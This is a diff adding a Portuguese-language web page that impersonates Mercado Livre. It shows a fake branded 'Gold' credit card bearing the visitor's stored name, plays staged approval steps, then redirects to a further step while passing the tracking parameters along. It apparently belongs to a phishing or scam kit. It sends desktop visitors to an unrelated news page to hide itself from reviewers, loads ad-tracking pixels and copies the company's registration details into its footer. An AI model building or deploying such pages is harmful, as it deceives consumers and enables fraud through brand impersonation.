@@ -1,0 +1,305 @@
+﻿<html lang="pt-BR">
+
+<head>
+ 
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <link rel="stylesheet" href="css/all.min-4.css">
+  <title>Análise de Cartão</title>
+  
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #ffffff;
+      color: white;
+      text-align: center;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      border-bottom: 1px solid #aa9900;
+      background-color: #FFE600;
+    }
+
+    .header img {
+      width: 125px;
+      padding: 10px;
+    }
+
+    .logo {
+      margin-left: 20px;
+    }
+
+    .content {
+      padding: 20px;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    .card {
+      background: linear-gradient(45deg, #efa000, #FFE600);
+      border-radius: 15px;
+      padding: 20px;
+      height: 165px;
+      position: relative;
+      margin-bottom: 30px;
+    }
+
+    .card-top {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 100px;
+    }
+
+    .card-bottom {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+    }
+
+    .card-name {
+      font-family: 'Sora', sans-serif;
+      font-size: 14px;
+      color: rgb(0, 0, 0);
+    }
+
+    .loading-item {
+      color: #666;
+      font-family: 'Sora', sans-serif;
+      margin: 15px 0;
+      opacity: 0;
+      transition: opacity 0.3s;
+    }
+
+    .loading-item.visible {
+      opacity: 1;
+    }
+
+    .loading-spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      margin-right: 10px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #FFE600;
+      border-radius: 50%;
+      margin-bottom: -10px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+
+
+<script type="text/javascript">
+    // Verifica o dispositivo e redireciona antes de carregar outros recursos
+    if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+      window.location.replace('https://gironews.com/negocios/fidelizacao-em-parceria-54183/');
+    }
+  </script>
+  <script>
+    window.pixelId = "6903840b1d5bdac30702fe0f";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+<script>
+  window.pixelId = "6903840b1d5bdac30702fe0f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.tikTokPixelId = "69ef9622c928c0ab98c3bffc";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+</head>
+
+<body>
+
+  <div class="header">
+    <img src="images/logo.png" alt="Logo Mercado Livre" class="logo">
+  </div>
+
+  <div class="content">
+    <h2 style="font-family: 'Sora', sans-serif; color: #202020; margin-bottom: 30px;">
+      Aguarde enquanto processamos seu pedido
+    </h2>
+
+    <div class="card" style="background: linear-gradient(135deg, #efa000, #FFE600); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); overflow: hidden; position: relative;">
+      <!-- Efeito de brilho no cartão -->
+      <div style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shine 3s infinite; z-index: 1;">
+      </div>
+      <style>
+        @keyframes shine {
+          0% {
+            left: -100%;
+          }
+
+          20% {
+            left: 100%;
+          }
+
+          100% {
+            left: 100%;
+          }
+        }
+      </style>
+
+      <div class="card-top">
+        <img src="images/logo.png" alt="Logo Mercado Livre" style="width: 100px; filter: drop-shadow(0 2px 3px rgba(0,0,0,0.2));">
+        <div style="font-size: 12px; color: rgba(0,0,0,0.8); font-family: 'Sora', sans-serif; text-transform: uppercase; letter-spacing: 1px;">
+          Gold</div>
+      </div>
+
+      <div style="position: absolute; top: 45%; left: 0; transform: translateY(-50%); width: 100%;">
+        <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+          <div style="display: flex; align-items: center; margin-left: 20px;">
+            <img src="images/chip.png" alt="Chip" style="width: 40px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));">
+          </div>
+          <i class="fas fa-wifi fa-rotate-90" style="color: rgb(0, 0, 0); font-size: 24px; margin-right: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.3);"></i>
+        </div>
+      </div>
+
+      <div class="card-bottom">
+        <div style="display: flex; flex-direction: column; align-items: flex-start;">
+          <span class="card-name" id="cardName" style="text-shadow: 0 1px 2px rgba(0,0,0,0.3); letter-spacing: 1px;">
+            <script>
+              const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
+              document.getElementById('cardName').textContent = dadosUsuario.NOME.toUpperCase();
+            </script>
+          </span>
+          <span style="font-size: 8px; color: rgba(0,0,0,0.7); font-family: 'Sora', sans-serif; margin-top: 3px;">TITULAR DO
+            CARTÃO</span>
+        </div>
+        <div style="display: flex; flex-direction: column; align-items: flex-end;">
+          <img src="images/visa.png" alt="mastercard" style="width: 50px; filter: brightness(0);">
+          <span style="font-size: 8px; color: rgba(0,0,0,0.7); font-family: 'Sora', sans-serif; margin-top: 3px; text-transform: uppercase;">Crédito</span>
+        </div>
+      </div>
+
+      <!-- Padrão de segurança no fundo do cartão -->
+      <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, rgba(0,0,0,0.03) 0px, rgba(0,0,0,0.03) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 0;">
+      </div>
+    </div>
+
+    <div id="loadingItems" style="margin: 0px 20px;">
+      <div class="loading-item" style="text-align: left;">
+        <div class="loading-spinner"></div>
+        Aguardando resposta
+      </div>
+      <div class="loading-item" style="text-align: left;">
+        <div class="loading-spinner"></div>
+        Analisando seu perfil
+      </div>
+      <div class="loading-item" style="text-align: left;">
+        <div class="loading-spinner"></div>
+        Preparando seu cartão
+      </div>
+      <div class="loading-item" style="text-align: left;">
+        <div class="loading-spinner"></div>
+        Finalizando solicitação
+      </div>
+    </div>
+  </div>
+
+  <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
+    <div style="max-width: 600px; margin: 0 auto;">
+      <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+        Mercado Livre Brasil LTDA | CNPJ: 79.379.491.0008-50
+      </p>
+      <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+        Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903
+      </p>
+      <p style="color: #999; font-size: 9px; margin-top: 5px;">
+        © 2025 - Todos os direitos reservados
+      </p>
+    </div>
+  </footer>
+
+  <script>
+    function showLoadingItems() {
+      const items = document.querySelectorAll('.loading-item');
+      items.forEach((item, index) => {
+        setTimeout(() => {
+          item.classList.add('visible');
+
+          // Adiciona o check com círculo após o item ficar visível
+          setTimeout(() => {
+            const spinner = item.querySelector('.loading-spinner');
+            spinner.style.display = 'none'; // Esconde o spinner
+            spinner.insertAdjacentHTML('afterend', `
+                            <div style="
+                                width: 20px;
+                                height: 20px;
+                                background-color: #4CAF50;
+                                border-radius: 50%;
+                                display: inline-flex;
+                                align-items: center;
+                                justify-content: center;
+                                position: relative;
+                                margin-right: 10px;
+                                vertical-align: middle;
+                            ">
+                                <i class="fas fa-check" style="color: white; font-size: 14px;"></i>
+                            </div>
+                        `);
+          }, 1000);
+        }, index * 1500);
+      });
+
+      setTimeout(() => {
+        window.location.href = buildUrlWithParams('online/7/index.html');
+      }, 6000);
+    }
+
+    function getUrlParams() {
+      const params = {};
+      const urlParams = new URLSearchParams(window.location.search);
+      for (const [key, value] of urlParams) {
+        params[key] = value;
+      }
+      return params;
+    }
+
+    function buildUrlWithParams(baseUrl) {
+      const fullUrl = new URL(baseUrl, window.location.origin);
+      const params = getUrlParams();
+
+      Object.keys(params).forEach(key => {
+        fullUrl.searchParams.append(key, params[key]);
+      });
+
+      return fullUrl.toString();
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+      showLoadingItems();
+    });
+  </script>
+
+
+</body>
+
+</html>
